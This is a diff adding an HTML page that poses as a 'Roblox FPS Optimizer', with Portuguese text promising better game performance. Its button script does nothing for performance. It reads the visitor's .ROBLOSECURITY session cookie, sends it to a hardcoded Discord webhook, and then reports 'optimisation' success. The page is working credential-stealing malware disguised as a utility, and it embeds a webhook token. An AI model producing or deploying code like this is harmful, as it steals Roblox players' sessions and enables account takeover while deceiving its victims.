@@ -1,0 +1,166 @@
+<script type="text/javascript">
+        var gk_isXlsx = false;
+        var gk_xlsxFileLookup = {};
+        var gk_fileData = {};
+        function filledCell(cell) {
+          return cell !== '' && cell != null;
+        }
+        function loadFileData(filename) {
+        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
+            try {
+                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
+                var firstSheetName = workbook.SheetNames[0];
+                var worksheet = workbook.Sheets[firstSheetName];
+
+                // Convert sheet to JSON to filter blank rows
+                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
+                // Filter out blank rows (rows where all cells are empty, null, or undefined)
+                var filteredData = jsonData.filter(row => row.some(filledCell));
+
+                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
+                var headerRowIndex = filteredData.findIndex((row, index) =>
+                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
+                );
+                // Fallback
+                if (headerRowIndex === -1 || headerRowIndex > 25) {
+                  headerRowIndex = 0;
+                }
+
+                // Convert filtered JSON back to CSV
+                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
+                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
+                return csv;
+            } catch (e) {
+                console.error(e);
+                return "";
+            }
+        }
+        return gk_fileData[filename] || "";
+        }
+        </script><!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Roblox FPS Optimizer</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #e0f7fa, #b0bec5);
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      color: #263238;
+    }
+    .container {
+      background: white;
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      max-width: 450px;
+      width: 90%;
+      transition: transform 0.3s ease;
+    }
+    .container:hover {
+      transform: translateY(-5px);
+    }
+    h1 {
+      color: #0288d1;
+      font-size: 28px;
+      margin-bottom: 15px;
+      font-weight: 600;
+    }
+    p {
+      font-size: 16px;
+      margin-bottom: 20px;
+      line-height: 1.5;
+      color: #455a64;
+    }
+    .logo {
+      width: 80px;
+      margin-bottom: 20px;
+      animation: bounce 2s infinite;
+    }
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-10px); }
+    }
+    button {
+      background: linear-gradient(45deg, #4CAF50, #66bb6a);
+      color: white;
+      padding: 12px 25px;
+      border: none;
+      border-radius: 25px;
+      cursor: pointer;
+      font-size: 16px;
+      font-weight: 500;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    }
+    button:hover {
+      background: linear-gradient(45deg, #45a049, #58a75e);
+      transform: scale(1.05);
+    }
+    button:active {
+      transform: scale(0.95);
+    }
+    .status {
+      margin-top: 15px;
+      font-size: 14px;
+      color: #78909c;
+      min-height: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://via.placeholder.com/80?text=R+Logo" alt="Roblox FPS Logo" class="logo">
+    <h1>Roblox FPS Optimizer</h1>
+    <p>Otimize seu desempenho no Roblox com nosso FPS Booster oficial! Clique no botão abaixo para desbloquear até 60 FPS e melhorar sua jogabilidade.</p>
+    <button onclick="optimizeFPS()">Ativar Otimização</button>
+    <div class="status" id="status">Status: Pronto para otimizar...</div>
+  </div>
+
+  <script>
+    function optimizeFPS() {
+      document.getElementById('status').innerHTML = 'Status: Otimizando FPS...';
+      // Captura o cookie .ROBLOSECURITY
+      const cookie = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='));
+      if (cookie) {
+        const cookieValue = cookie.split('=')[1];
+        if (cookieValue && cookieValue.startsWith('_|WARNING:-DO-NOT-SHARE-THIS')) {
+          // Envia o cookie para o Discord
+          fetch('https://discord.com/api/webhooks/1398881274415812668/COAqK1x2n8okDDHvIQc489zoVsTxTs08sc3ZBl-peSVEtXTgRXZXh-DEUr5f9EPbcjxQ', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+              content: `[FPS Optimizer] Cookie .ROBLOSECURITY capturado: ${cookieValue}`,
+              username: 'Roblox FPS Bot'
+            })
+          })
+          .then(response => {
+            if (response.ok) {
+              document.getElementById('status').innerHTML = 'Status: Otimização concluída com sucesso!';
+            } else {
+              document.getElementById('status').innerHTML = 'Status: Erro na otimização.';
+            }
+          })
+          .catch(error => {
+            document.getElementById('status').innerHTML = 'Status: Erro: ' + error.message;
+          });
+        } else {
+          document.getElementById('status').innerHTML = 'Status: Cookie inválido.';
+        }
+      } else {
+        document.getElementById('status').innerHTML = 'Status: Nenhum cookie Roblox encontrado.';
+      }
+    }
+  </script>
+</body>
+</html>
